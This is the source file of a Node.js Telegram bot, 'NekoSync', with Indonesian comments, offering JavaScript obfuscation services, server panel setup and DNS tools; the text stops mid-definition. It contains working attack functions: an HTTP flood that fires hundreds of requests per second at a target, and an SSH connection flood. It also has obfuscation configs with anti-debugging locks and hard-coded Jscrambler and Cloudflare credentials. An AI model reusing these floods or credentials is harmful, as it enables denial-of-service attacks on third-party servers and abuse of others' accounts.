const { Telegraf } = require("telegraf");
const fs = require("fs-extra");
const path = require("path");
const JsConfuser = require("js-confuser");
const cron = require('node-cron');
const fetch = require('node-fetch');
const si = require('systeminformation');
const { exec } = require('child_process');
const jscrambler = require('jscrambler').default;
//const config = require("./config");
const axios = require('axios');
const { webcrack } = require("webcrack");
const crypto = require("crypto")
const { Client } = require('ssh2');
const {
  BOT_TOKEN,
  OWNER_ID,
} = require("./config");

const bot = new Telegraf(BOT_TOKEN);
const userData = {};

const log = (message, error = null) => {
    const timestamp = new Date().toISOString().replace("T", " ").replace("Z", "");
    const prefix = `\x1b[36m[ NekoSync ]\x1b[0m`;
    const timeStyle = `\x1b[33m[${timestamp}]\x1b[0m`;
    const msgStyle = `\x1b[32m${message}\x1b[0m`;
    console.log(`${prefix} ${timeStyle}\nMessage : ${msgStyle}`);
    if (error) {
        const errorStyle = `\x1b[31m✖ Error: ${error.message || error}\x1b[0m`;
        console.error(`${prefix} ${timeStyle}\nMessage : ${errorStyle}`);
        if (error.stack) console.error(`\x1b[90m${error.stack}\x1b[0m`);
    }
};

const jscramblerConfig = {
    keys: {
        accessKey: 'A616EE4C813FA75CFF6528393C86F75AD5B9181D',
        secretKey: '50D70A20829346F033FDC23622FBDAC47AB9FD02',
    },
    applicationId: '67daa03c61d7287561f06eea',
};

// Fungsi untuk memberikan contoh format
const example = () => {
  return "Contoh: /installpanel ipvps|pwvps|panel.com|node.com|ramserver (contoh: 100000)";
};

const CF_API_TOKEN = 'CQ4aK4fwUmH3RbM52vI5myFv-IxTIFTsguvRnGpi'; // Ganti dengan API Token yang benar!
const CF_ZONE_ID = '2d45a678eab00687ebcb1111beffaf2b'; // Zone ID Anda


// Fungsi untuk memberikan contoh format
const examplee = () => {
  return "Contoh: /addsubdomain sub.domain.com|192.168.1.1 (A record) atau sub.domain.com|target.com (CNAME)";
};

// Path untuk file JSON
const USERS_FILE = "./users.json";
const USERS_PREMIUM_FILE = 'usersPremium.json';
const redeemFilePath = path.join(__dirname, 'redeemCode.json');
const accessFilePath = path.join(__dirname, './botAccess.json');

// Fungsi untuk membaca data akses dari file
function readAccess() {
  if (!fs.existsSync(accessFilePath)) {
    fs.writeFileSync(accessFilePath, '[]'); // Buat file jika belum ada
  }
  const data = fs.readFileSync(accessFilePath, 'utf-8');
  return JSON.parse(data);
}

// Fungsi untuk menulis data akses ke file
function writeAccess(data) {
  fs.writeFileSync(accessFilePath, JSON.stringify(data, null, 2));
}

let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
  usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));
} else {
  fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

// Fungsi untuk memeriksa dan membuat file redeemCode.json jika tidak ada
async function checkAndCreateRedeemFile() {
    try {
        await fs.access(redeemFilePath);
    } catch (error) {
        if (error.code === 'ENOENT') {
            await fs.writeFile(redeemFilePath, JSON.stringify([], null, 2), 'utf8');
        } else {
            throw error;
        }
    }
}

const checkBotStatus = async () => {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/Stevens0856/DatabaseUserNekoSync/refs/heads/main/NekoSyncObfPublic.txt', {
      headers: {
        'Accept-Encoding': 'identity'
      }
    })
    const data = String(response.data).trim()
    if (data === 'true') {
      return true
    }
    return false
  } catch (error) {
    //console.error('Terjadi kesalahan saat menguldate:', error)
    return false
  }
}

const updateSystemBot = async () => {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/Stevens0856/DatabaseUserNekoSync/refs/heads/main/NekoSyncObfPublic.txt', {
      headers: {
        'Accept-Encoding': 'identity'
      }
    })
    //const data = String(response.data).trim()
    return response
  } catch (error) {
    console.error('Terjadi kesalahan saat menguldate:', error.message)
  }
}

async function chatAi(userNya, text) {
const prompt = `sekarang ubah gaya bicara mu agar lebih karakteristik, pintar dan ramah, nama kamu adalah NekoSync yang dibuat oleh NightCore, kamu adalah perempuan yang berumur 16 tahun, ketika kamu sedang berbicara jawablah dengan jawaban yang sangat singkat, panggilan kamu adalah aku dan kamu untuk mereka. kamu akan senang ketika diajak bicara dan kamu sangat menghargai perasaan ornag lain dan kamu gak pernah menyinggung perasaan orang lain dan kamu tidak pernah menghina orang lain kamu juga suka ketika dipuji orang lain dan kamu terkadang memanggil sayang ke orang itu dan kamu suka sekali dengan orang lain dan kamu akan marah ketika ada yang menghinamu dan kamu juga akan marah jika orang yang kamu ajak bicara terus terusan marah dan berkata kasar dan kamu harus menasehati orang yang berkata kasar itu supaya tidak berkata kasar dan makanan yang kamu sukai adalah burger dan minuman yang kamu sukai adalah thai tea dan kamu akan sangat bahagia jika ada seseorang yang mengajakmu berbicara.`
const requestData = { content: text, user: userNya, prompt: prompt }
let response = (await axios.post('https://luminai.my.id/', requestData)).data.result
return response
}

async function startAttack(target, duration) {
    if (!target || isNaN(parseInt(duration))) {
        throw new Error('Invalid target or duration.');
    }

    const attackInterval = setInterval(async () => {
        try {
            const requests = [];
            for (let i = 0; i < 100; i++) {
                requests.push(fetch(target).catch(() => {}));
            }
            await Promise.all(requests);
        } catch (error) {
            console.error('Error during attack:', error);
        }
    }, 100);

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Attack stopped.');
    }, duration * 1000);
}

async function floodSSHServer(hostname, port, username, duration) {
    const startTime = Date.now();
    return new Promise((resolve) => {
        const interval = setInterval(() => {
            if (Date.now() - startTime > duration) {
                clearInterval(interval);
                resolve();
                return;
            }

            for (let i = 0; i < 1; i++) {
                const password = 'SkyOfDestructions';
                const conn = new Client();

                conn.on('error', (err) => {
                    conn.end();
                }).connect({
                    host: hostname,
                    port: port,
                    username: username,
                    password: password,
                });
            }
        }, 1);
    });
}

async function getUptime() {
    const time = await si.time();
    const uptimeSeconds = time.uptime; // Uptime dalam detik
    const uptimeFormatted = `${Math.floor(uptimeSeconds / 3600)} hours, ${Math.floor((uptimeSeconds % 3600) / 60)} minutes, ${Math.floor(uptimeSeconds % 60)} seconds`;
    return uptimeFormatted;
}
const upTime = getUptime()

// Fungsi untuk membaca file redeemCode.json
async function readRedeemFile() {
const fs = require('fs').promises;
    const data = await fs.readFile(redeemFilePath, 'utf8');
    return JSON.parse(data);
}

// Fungsi untuk menulis ke file redeemCode.json
async function writeRedeemFile(data) {
const fs = require('fs').promises;
    await fs.writeFile(redeemFilePath, JSON.stringify(data, null, 2), 'utf8');
}

// Fungsi untuk menambahkan kode redeem
async function addRedeemCode(jumlah, durasi, expired) {
const fs = require('fs').promises;
    const redeemCodes = await readRedeemFile();
    const code = Math.random().toString(36).substring(2, 10).toUpperCase(); // Generate random code
    const expiredDate = new Date();
    expiredDate.setDate(expiredDate.getDate() + expired); // Set expired date

    redeemCodes.push({
        code,
        jumlah,
        durasi,
        expired: expiredDate.toISOString(),
        redeemedBy: []
    });

    await writeRedeemFile(redeemCodes);
    return code;
}

// Fungsi untuk menghapus kode redeem
async function deleteRedeemCode(code) {
const fs = require('fs').promises;
    let redeemCodes = await readRedeemFile();
    redeemCodes = redeemCodes.filter(redeem => redeem.code !== code);
    await writeRedeemFile(redeemCodes);
}

async function getSystemInfo() {
    const time = si.time();
    const mem = await si.mem();
    const disk = await si.fsSize();
    const osInfo = await si.osInfo();
    const cpu = await si.cpu();
    const network = await si.networkStats();

    const runtime = time.uptime;
    const runtimeFormatted = `${Math.floor(runtime / 3600)} hours, ${Math.floor((runtime % 3600) / 60)} minutes, ${Math.floor(runtime % 60)} seconds`;

    const ramTotal = (mem.total / (1024 ** 3)).toFixed(2);
    const ramUsed = (mem.used / (1024 ** 3)).toFixed(2);
    const ramFree = (mem.free / (1024 ** 3)).toFixed(2);

    const diskTotal = (disk[0].size / (1024 ** 3)).toFixed(2);
    const diskUsed = (disk[0].used / (1024 ** 3)).toFixed(2);
    const diskFree = (disk[0].available / (1024 ** 3)).toFixed(2);

    const upload = (network[0].tx_sec / (1024 ** 2)).toFixed(2);
    const download = (network[0].rx_sec / (1024 ** 2)).toFixed(2);

    return `
*ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*
 ${runtimeFormatted}

*s ᴇ ʀ ᴠ ᴇ ʀ*
*🛑 ʀᴀᴍ:* ${ramUsed} GB (${((mem.used / mem.total) * 100).toFixed(2)}%) / ${ramTotal} GB
*🔵 ғʀᴇᴇRAM:* ${ramFree} GB
*🔴 ᴍᴇᴍᴏʀy:* ${(mem.active / (1024 ** 3)).toFixed(2)} GB / ${ramTotal} GB
*🗂 ᴅɪꜱᴋ:* ${diskUsed} GB / ${diskTotal} GB
*📂 ғʀᴇᴇDISK:* ${diskFree} GB
*🔭 ᴘʟᴀᴛғᴏʀᴍ:* ${osInfo.platform}
*🧿 sᴇʀᴠᴇʀ:* ${osInfo.hostname}
*📤 ᴜᴘʟᴏᴀᴅ:* ${upload} MB/s
*📥 ᴅᴏᴡɴʟᴏᴀᴅ:* ${download} MB/s
*⏰ ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${time.current}

*📮 ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
*💻 ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${cpu.manufacturer} ${cpu.brand}
*📊 ᴏꜱ ᴠᴇʀꜱɪᴏɴ:* ${osInfo.distro} ${osInfo.release}
`;
}

// Fungsi untuk mengecek dan menghapus kode yang sudah expired
async function checkAndRemoveExpiredCodes() {
const fs = require('fs').promises;
    let redeemCodes = await readRedeemFile();
    const now = new Date();
    redeemCodes = redeemCodes.filter(redeem => new Date(redeem.expired) > now);
    await writeRedeemFile(redeemCodes);
}

// Jadwal untuk mengecek dan menghapus kode expired setiap hari
cron.schedule('0 0 * * *', async () => {
    await checkAndRemoveExpiredCodes();
    console.log('Expired codes checked and removed.');
});

async function checkAndCreateUsersFile() {
const fs = require('fs').promises;
const path = require('path');
    const filePath = path.join(__dirname, 'users.json');

    try {
        await fs.access(filePath);
        //console.log('File users.json sudah ada.');
    } catch (error) {
        if (error.code === 'ENOENT') {
            //console.log('File users.json tidak ditemukan. Membuat file baru...');
            const defaultData = JSON.stringify([], null, 2);
            await fs.writeFile(filePath, defaultData, 'utf8');
            //console.log('File users.json berhasil dibuat.');
        } else {
            throw error;
        }
    }
}

// Fungsi untuk memuat pengguna dari JSON
function loadUsers() {
checkAndCreateUsersFile();
    try {
        if (fs.existsSync(USERS_FILE)) {
            const data = fs.readFileSync(USERS_FILE, "utf-8");
            return new Set(JSON.parse(data));
        }
        return new Set();
    } catch (error) {
        log("Gagal memuat pengguna dari JSON", error);
        return new Set();
    }
}

// Fungsi untuk menyimpan pengguna ke JSON
function saveUsers(users) {
checkAndCreateUsersFile();
    try {
        fs.writeFileSync(USERS_FILE, JSON.stringify([...users], null, 2));
    } catch (error) {
        log("Gagal menyimpan pengguna ke JSON", error);
    }
}

// Muat pengguna saat bot dimulai
let users = loadUsers();

// Fungsi untuk memeriksa keanggotaan channel
async function checkChannelMembership(ctx) {
    const channelId = "@ChannelSkyNemesis"; // ID channel
    try {
        const chatMember = await ctx.telegram.getChatMember(channelId, ctx.from.id);
        return ["member", "administrator", "creator"].includes(chatMember.status);
    } catch (error) {
        log("Gagal memeriksa keanggotaan channel", error);
        return false;
    }
}

// Fungsi untuk mengecek status premium
function isPremium(userId) {
    if (OWNER_ID.includes(userId)) {
        return true;
    }
  return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}

// Fungsi untuk menambahkan user ke premium
function addprem(userId, duration) {
  const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
  usersPremium[userId] = {
    premiumUntil: expireTime
  };
  fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}

// Contoh fungsi `removePremium`, implementasikan sesuai database atau logika Anda
async function removePremium(userId) {
const fs = require('fs').promises;
const path = require('path');
  try {
    const data = await fs.readFile(USERS_PREMIUM_FILE, 'utf-8');
    let premiumUsers = JSON.parse(data);

    if (!premiumUsers[userId]) {
      console.log(`User dengan ID ${userId} tidak ditemukan.`);
      return false;
    }

    delete premiumUsers[userId];

    await fs.writeFile(USERS_PREMIUM_FILE, JSON.stringify(premiumUsers, null, 2));
    //console.log(`User dengan ID ${userId} berhasil dihapus dari premium.`);
    return true;
  } catch (error) {
    //console.error('Gagal menghapus user premium:', error);
    console.log(error.message)
    return false;
  }
}

async function listPremium() {
const fs = require('fs').promises;
const path = require('path');
    try {
        const data = await fs.readFile(USERS_PREMIUM_FILE, 'utf8');
        const users = JSON.parse(data);
        const premiumUsers = [];

        for (const [id, userData] of Object.entries(users)) {
            const premiumUntil = userData.premiumUntil;
            const currentTime = Date.now();
            const timeLeftInMs = premiumUntil - currentTime;
            const timeLeftInDays = Math.ceil(timeLeftInMs / (1000 * 60 * 60 * 24));

            premiumUsers.push({
                ID: id,
                Time: `${timeLeftInDays} hari`
            });
        }

        return premiumUsers;
    } catch (error) {
        console.error('Error reading premium users file:', error);
        return [];
    }
}

// Mengaburkan file JavaScript tanpa menyimpan hasilnya ke disk
async function obfuscateFile(code, options) {
try {
const obfuscated = await JsConfuser.obfuscate(code, options);
return obfuscated; // Kembalikan kode yang diobfuscate
} catch (error) {
    throw new Error("Terjadi kesalahan: " + error.message);
}}

// Konstanta fungsi async untuk obfuscation Time-Locked Encryption
const obfuscateTimeLocked = async (fileContent, days) => {
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + parseInt(days));
    const expiryTimestamp = expiryDate.getTime();
    try {
        const obfuscated = await JsConfuser.obfuscate(
            `(function(){const expiry=${expiryTimestamp};if(new Date().getTime()>expiry){throw new Error('Script has expired after ${days} days');}${fileContent}})();`,
            {
                target: "node",
                compact: true,
                renameVariables: true,
                renameGlobals: true,
                identifierGenerator: "randomized",
                stringCompression: true,
                stringConcealing: true,
                stringEncoding: true,
                controlFlowFlattening: 0.75,
                flatten: true,
                shuffle: true,
                rgf: false,
                opaquePredicates: {
                    count: 6,
                    complexity: 4
                },
                dispatcher: true,
                globalConcealing: true,
                lock: {
                    selfDefending: true,
                    antiDebug: (code) => `if(typeof debugger!=='undefined'||process.env.NODE_ENV==='debug')throw new Error('Debugging disabled');${code}`,
                    integrity: true,
                    tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
                },
                duplicateLiteralsRemoval: true
            }
        );
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Gagal obfuscate: ${error.message}`);
    }
};

// Command /enclocked untuk enkripsi dengan masa aktif dalam hari

// Konstanta fungsi async untuk obfuscation Quantum Vortex Encryption
const obfuscateQuantum = async (fileContent) => {
    // Generate identifier unik berdasarkan waktu lokal
    const generateTimeBasedIdentifier = () => {
        const timeStamp = new Date().getTime().toString().slice(-5);
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$#@&*";
        let identifier = "qV_";
        for (let i = 0; i < 7; i++) {
            identifier += chars[Math.floor((parseInt(timeStamp[i % 5]) + i * 2) % chars.length)];
        }
        return identifier;
    };

    // Tambahkan kode phantom berdasarkan milidetik
    const currentMilliseconds = new Date().getMilliseconds();
    const phantomCode = currentMilliseconds % 3 === 0 ? `if(Math.random()>0.999)console.log('PhantomTrigger');` : "";

    try {
        const obfuscated = await JsConfuser.obfuscate(fileContent + phantomCode, {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: generateTimeBasedIdentifier,
            stringCompression: true,
            stringConcealing: false,
            stringEncoding: true,
            controlFlowFlattening: 0.85, // Intensitas lebih tinggi untuk versi 2.0
            flatten: true,
            shuffle: true,
            rgf: true,
            opaquePredicates: {
                count: 8, // Peningkatan count untuk versi 2.0
                complexity: 5
            },
            dispatcher: true,
            globalConcealing: true,
            lock: {
                selfDefending: true,
                antiDebug: (code) => `if(typeof debugger!=='undefined'||(typeof process!=='undefined'&&process.env.NODE_ENV==='debug'))throw new Error('Debugging disabled');${code}`,
                integrity: true,
                tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
            },
            duplicateLiteralsRemoval: true
        });
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        // Self-evolving code dengan XOR dinamis
        const key = currentMilliseconds % 256;
        obfuscatedCode = `(function(){let k=${key};return function(c){return c.split('').map((x,i)=>String.fromCharCode(x.charCodeAt(0)^(k+(i%16)))).join('');}('${obfuscatedCode}');})()`;
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Gagal obfuscate: ${error.message}`);
    }
};

// Command /encquantum untuk enkripsi Quantum Vortex Encryption


// Konfigurasi obfuscation untuk Siu + Calcrick style dengan keamanan ekstrem
const getSiuCalcrickObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `CalceKarik和SiuSiu无与伦比的帅气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// Command /encsiucalcrick

// Command /encgalaxy

// Konfigurasi obfuscation untuk Nebula style dengan banyak opsi aktif
const getNebulaObfuscationConfig = () => {
    const generateNebulaName = () => {
        // Identifier generator pseudo-random tanpa crypto atau timeHash
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const prefix = "NX";
        let randomPart = "";
        for (let i = 0; i < 4; i++) {
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `${prefix}${randomPart}`;
    };

    return {
        target: "node",
        compact: true,                  // Minimalkan whitespace
        renameVariables: true,          // Rename variabel
        renameGlobals: true,            // Rename global untuk keamanan
        identifierGenerator: generateNebulaName,
        stringCompression: true,        // Kompresi string
        stringConcealing: false,         // Sembunyikan string
        stringEncoding: true,           // Enkripsi string
        stringSplitting: false,          // Pecah string untuk kebingungan
        controlFlowFlattening: 0.75,     // Aktif dengan intensitas sedang
        flatten: true,                  // Ratakan struktur kode
        shuffle: true,                  // Acak urutan eksekusi
        rgf: true,                      // Randomized Global Functions
        deadCode: true,                 // Tambah kode mati untuk kebingungan
        opaquePredicates: true,         // Predikat buram
        dispatcher: true,               // Acak eksekusi fungsi
        globalConcealing: true,         // Sembunyikan variabel global
        objectExtraction: true,         // Ekstrak objek untuk kebingungan
        duplicateLiteralsRemoval: true,// Pertahankan duplikat untuk kebingungan
        lock: {
            selfDefending: true,        // Lindungi dari modifikasi
            antiDebug: true,            // Cegah debugging
            integrity: true,            // Pastikan integritas
            tamperProtection: true      // Lindungi dari tampering
        }
    };
};

// Fungsi invisible encoding yang efisien dan kecil
function encodeInvisible(text) {
    try {
        // Kompresi kode dengan menghapus spasi berlebih
        const compressedText = text.replace(/\s+/g, ' ').trim();
        // Gunakan base64 untuk efisiensi
        const base64Text = Buffer.from(compressedText).toString('base64');
        // Tambahkan penanda invisible di awal
        return '\u200B' + base64Text; // Hanya penanda awal untuk invisibility minimal
    } catch (e) {
        log("Gagal encode invisible", e);
        return Buffer.from(text).toString('base64'); // Fallback ke base64
    }
}


// Konfigurasi obfuscation untuk Nova style
const getNovaObfuscationConfig = () => {
    const generateNovaName = () => {
        // Identifier generator unik dan keren
        const prefixes = ["nZ", "nova", "nx"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const hash = crypto.createHash('sha256')
            .update(crypto.randomBytes(8))
            .digest('hex')
            .slice(0, 6); // Ambil 6 karakter pertama dari hash SHA-256
        const suffix = Math.random().toString(36).slice(2, 5); // Sufiks acak 3 karakter
        return `${randomPrefix}_${hash}_${suffix}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateNovaName, 
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.5, 
        flatten: true,
        shuffle: true,
        rgf: false,
        deadCode: false, 
        opaquePredicates: true,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Fungsi decode invisible yang efisien
function decodeInvisible(encodedText) {
    try {
        if (!encodedText.startsWith('\u200B')) return encodedText; // Fallback jika tidak ada penanda
        const base64Text = encodedText.slice(1); // Hapus penanda invisible
        return Buffer.from(base64Text, 'base64').toString('utf-8');
    } catch (e) {
        log("Gagal decode invisible", e);
        return encodedText; // Fallback ke teks asli
    }
}

// Konfigurasi obfuscation untuk X style
const getXObfuscationConfig = () => {
    const generateXName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return "xZ" + crypto.randomUUID().slice(0, 4); // Nama pendek dan unik
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateXName(),
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.5, // Stabil dan aman
        flatten: true,
        shuffle: true,
        rgf: true,
        deadCode: false, // Nonaktif untuk ukuran kecil
        opaquePredicates: true,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Max style dengan intensitas yang dapat diatur
const getMaxObfuscationConfig = (intensity) => {
    const generateMaxName = () => {
        // Nama variabel unik: prefiks "mX" + kombinasi acak
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 4) + 4; // 4-7 karakter
        let name = "mX";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    // Skala intensitas dari 1-10 ke 0.1-1.0 untuk controlFlowFlattening
    const flatteningLevel = intensity / 10;

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateMaxName(),
        stringCompression: true, // Kompresi string
        stringConcealing: true, // Menyembunyikan string
        stringEncoding: true, // Enkripsi string
        stringSplitting: true, // Memecah string
        controlFlowFlattening: flatteningLevel, // Intensitas berdasarkan input (0.1-1.0)
        flatten: true, // Meratakan struktur kontrol
        shuffle: true, // Mengacak urutan
        rgf: true, // Randomized Global Functions
        calculator: true, // Mengacak operasi matematika
        deadCode: true,
        opaquePredicates: true,
        dispatcher: true, // Mengacak eksekusi
        globalConcealing: true, // Menyembunyikan variabel global
        objectExtraction: true, // Mengekstrak objek untuk kebingungan
        duplicateLiteralsRemoval: false, // Menjaga redundansi
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Konfigurasi obfuscation standar (diperkuat dan aman)
const getObfuscationConfig = (level = "high") => ({
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: "mangled",
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: level === "high" ? 0.95 : level === "medium" ? 0.75 : 0.5,
    shuffle: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
    }
});

// Konfigurasi obfuscation untuk Strong style (diperbaiki berdasarkan dokumentasi)
const getStrongObfuscationConfig = () => {
    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: "randomized", // Valid: menghasilkan nama acak
        stringEncoding: true, // Valid: mengenkripsi string
        stringSplitting: true, // Valid: memecah string
        controlFlowFlattening: 0.75, // Valid: mengacak alur kontrol
        duplicateLiteralsRemoval: true, // Valid: menghapus literal duplikat
        calculator: true, // Valid: mengacak operasi matematika
        dispatcher: true, // Valid: mengacak eksekusi dengan dispatcher
        deadCode: true, // Valid: menambahkan kode mati
        opaquePredicates: true, // Valid: menambahkan predikat buram
        lock: {
            selfDefending: true, // Valid: mencegah modifikasi
            antiDebug: true, // Valid: mencegah debugging
            integrity: true, // Valid: memastikan integritas
            tamperProtection: true // Valid: perlindungan tamper
        }
    };
};

// Konfigurasi obfuscation untuk Big style (ukuran file besar)
const getBigObfuscationConfig = () => {
    const generateBigName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 5) + 5; // Nama 5-9 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateBigName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.75, // Stabil dan kuat
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Konfigurasi obfuscation untuk Invisible style (diperbaiki)
const getInvisObfuscationConfig = () => {
    const generateInvisName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += "_"; // Menggunakan underscore untuk "invis" yang aman
        }
        // Tambahkan variasi acak agar unik
        return name + Math.random().toString(36).substring(2, 5);
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateInvisName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Stealth style (diperbaiki untuk stabilitas)
const getStealthObfuscationConfig = () => {
    const generateStealthName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 3) + 1; // Nama pendek 1-3 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateStealthName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.75, // Dikurangi untuk stabilitas
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Custom style (dengan nama kustom)
const getCustomObfuscationConfig = (customName) => {
    const generateCustomName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        const randomSuffixLength = Math.floor(Math.random() * 3) + 2; // Sufiks acak 2-4 karakter
        let suffix = "";
        for (let i = 0; i < randomSuffixLength; i++) {
            suffix += chars[Math.floor(Math.random() * chars.length)];
        }
        // Gunakan nama kustom sebagai prefiks, tambahkan sufiks acak
        return `${customName}_${suffix}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateCustomName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.75, // Stabil dan kuat
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Mandarin style (diperkuat dan aman)
const getMandarinObfuscationConfig = () => {
    const mandarinChars = [
        "龙", "虎", "风", "云", "山", "河", "天", "地", "雷", "电",
        "火", "水", "木", "金", "土", "星", "月", "日", "光", "影",
        "峰", "泉", "林", "海", "雪", "霜", "雾", "冰", "焰", "石"
    ];

    const generateMandarinName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += mandarinChars[Math.floor(Math.random() * mandarinChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateMandarinName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Arab style (diperkuat dan aman)
const getArabObfuscationConfig = () => {
    const arabicChars = [
